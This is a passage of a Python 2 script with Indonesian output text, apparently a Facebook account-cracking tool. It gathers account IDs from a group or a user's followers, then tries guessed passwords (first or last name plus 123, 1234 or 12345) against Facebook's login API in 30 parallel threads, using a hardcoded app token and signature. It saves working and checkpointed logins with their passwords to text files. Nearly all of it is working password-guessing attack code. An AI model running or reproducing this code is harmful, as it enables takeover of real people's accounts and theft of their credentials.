                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
                oke = open("done/grup.txt", "a")
                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                oke.close()
                oks.append(zowe)
            else:
                if 'www.facebook.com' in ko['error_msg']:
                    print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos1
                    cek = open("done/grup.txt", "a")
                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos2 = j['first_name'].lower()+'1234'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
                        oke = open("done/grup.txt", "a")
                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                        oke.close()
                        oks.append(zowe)
                    else:
                        if 'www.facebook.com' in ko['error_msg']:
                            print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos2
                            cek = open("done/grup.txt", "a")
                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos3 = j['first_name'].lower()+'12345'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
                                oke = open("done/grup.txt", "a")
                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                oke.close()
                                oks.append(zowe)
                            else:
                                if 'www.facebook.com' in ko['error_msg']:
                                    print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos3
                                    cek = open("done/grup.txt", "a")
                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos4 = j['last_name'].lower()+'123'
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
                                        oke = open("done/grup.txt", "a")
                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                        oke.close()
                                        oks.append(zowe)
                                    else:
                                        if 'www.facebook.com' in ko['error_msg']:
                                            print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos4
                                            cek = open("done/grup.txt", "a")
                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                            cek.close()
                                            cekpoint.append(zowe)
                                        else:
                                            bos5 = j['last_name'].lower()+'1234'
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            ko = json.load(data)
                                            if 'access_token' in ko:
                                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
                                                oke = open("done/grup.txt", "a")
                                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                oke.close()
                                                oks.append(zowe)
                                            else:
                                                if 'www.facebook.com' in ko['error_msg']:
                                                    print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos5
                                                    cek = open("done/grup.txt", "a")
                                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                    cek.close()
                                                    cekpoint.append(zowe)
                                                else:
                                                    bos6 = j['last_name'].lower()+'12345'
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    ko = json.load(data)
                                                    if 'access_token' in ko:
                                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
                                                        oke = open("done/grup.txt", "a")
                                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
                                                        oke.close()
                                                        oks.append(zowe)
                                                    else:
                                                        if 'www.facebook.com' in ko['error_msg']:
                                                            print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos6
                                                            cek = open("done/grup.txt", "a")
                                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
                                                            cek.close()
                                                            cekpoint.append(zowe)
                                                                            
        except:
            pass
            
    p = ThreadPool(30)
    p.map(main, id)
    print "\n\033[1;94m──────────────────────────────────────────────────"
    print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mcape smlurt, gaada lagi '
    print"\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mTotal \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;96m"+str(len(cekpoint))
    print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;96mSudah disimpan di \033[1;91m: \033[1;92mdone/grup.txt'
    print 50* "\033[1;94m─"
    raw_input("\033[1;97m{<\033[1;96mbalik?\033[1;97m>}")
    os.system("python2 mulung.py")
    
##### CRACK FOLLOW #####
def crack_follow():
    toket=open('login.txt','r').read()
    os.system('clear')
    print logo
    print 50* "\033[1;94m─"
    print ("              \033[1;95m●●● \033[1;97mCRACK FOLLOWERS \033[1;95m●●●")
    print 50* "\033[1;94m─"
    idt = raw_input("\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mID Publik/Teman \033[1;91m:\033[1;92m ")
    try:
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
        print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mNama \033[1;91m:\033[1;92m "+op["name"]
    except KeyError:
        print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
        raw_input("\n\033[1;95m[\033[1;97m<balik?>\033[1;95m]")
        menu()
    except requests.exceptions.ConnectionError:
        print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
        keluar()
    r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
    z = json.loads(r.text)
    for i in z['data']:
        id.append(i['id'])
        
    print "\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mTotal ID Followers \033[1;91m:\033[1;92m "+str(len(id))
    print('\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mStop Tekan CTRL+Z')
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mSedang Jadi hemker ea mhank "+o),;sys.stdout.flush();time.sleep(1)
    print("\n\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mPake in mode pesawat kalo ga done,kalo ga buang aja hp nya kontol")
    print ("\033[1;94m──────────────────────────────────────────────────")
    
##### MAIN FOLLOW #####
    def main(arg):
        sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
        global cekpoint,oks
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower()+'123'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            ko = json.load(data)
            if 'access_token' in ko:
                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
                oke = open("done/follow.txt", "a")
                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                oke.close()
                oks.append(zowe)
            else:
                if 'www.facebook.com' in ko['error_msg']:
                    print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos1
                    cek = open("done/follow.txt", "a")
                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos2 = j['first_name'].lower()+'1234'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
                        oke = open("done/follow.txt", "a")
                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                        oke.close()
                        oks.append(zowe)
                    else:
                        if 'www.facebook.com' in ko['error_msg']:
                            print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos2
                            cek = open("done/follow.txt", "a")
                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos3 = j['first_name'].lower()+'12345'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
                                oke = open("done/follow.txt", "a")
                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                oke.close()
                                oks.append(zowe)
                            else:
                                if 'www.facebook.com' in ko['error_msg']:
                                    print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos3
                                    cek = open("done/follow.txt", "a")
                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos4 = j['last_name'].lower()+'123'
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
                                        oke = open("done/follow.txt", "a")
                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                        oke.close()
                                        oks.append(zowe)
                                    else:
                                        if 'www.facebook.com' in ko['error_msg']:
                                            print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
                                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
                                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
                                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos4
                                            cek = open("done/follow.txt", "a")
                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                            cek.close()
                                            cekpoint.append(zowe)
                                        else:
                                            bos5 = j['last_name'].lower()+'1234'
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            ko = json.load(data)
                                            if 'access_token' in ko:
                                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
                                                oke = open("done/follow.txt", "a")
                                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                oke.close()
                                                oks.append(zowe)
                                            else:
                                                if 'www.facebook.com' in ko['error_msg']:
                                                    print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
                                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
                                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
                                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos5
                                                    cek = open("done/follow.txt", "a")
                                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                    cek.close()
                                                    cekpoint.append(zowe)
                                                else:
                                                    bos6 = j['last_name'].lower()+'12345'
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    ko = json.load(data)
                                                    if 'access_token' in ko:
                                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
                                                        oke = open("done/follow.txt", "a")
                                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
                                                        oke.close()
                                                        oks.append(zowe)
                                                    else:
                                                        if 'www.facebook.com' in ko['error_msg']:
                                                            print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
                                                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
                                                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
                                                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos6
                                                            cek = open("done/follow.txt", "a")
                                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
                                                            cek.close()
                                                            cekpoint.append(zowe)
                                                                            
        except:
            pass
            
    p = ThreadPool(30)
    p.map(main, id)
    print "\n\033[1;94m──────────────────────────────────────────────────"
    print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mcape smlurt, gaada lagi '
    print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mTotal \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
    print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;95mSudah disimpan di \033[1;91m: \033[1;92mdone/follow.txt'
    print 50* "\033[1;94m─"
    raw_input("\033[1;97m{<\033[1;95mbalik?\033[1;97m>}")
    os.system("python2 mulung.py")
    
##### USERNAME ID ####
def user_id():
    os.system('clear')
    print logo
    print 50* "\033[1;94m─"
    ling = ('https://www.facebook.com/')
    url = ling+raw_input("\033[1;97m{\033[1;95m×\033[1;97m} Username : ")
    idre = re.compile('"entity_id":"([0-9]+)"')
    page = requests.get(url)
    print idre.findall(page.content)
    raw_input("\n\033[1;95m[\033[1;97m<balik?>\033[1;95m]")
    menu()
    
##### PERBARUI #####
def perbarui():
    os.system("clear")
    print logo
    print "\033[1;94m──────────────────────────────────────────────────"
    jalan ("\033[1;92mMemperbarui Script ...\033[1;93m")
    os.system("git pull origin master")
    raw_input("\n\033[1;94m{\033[1;97m<balik?>\033[1;94m}")
    os.system("python2 mulung.py")
    
if __name__=='__main__':
    menu()
    masuk()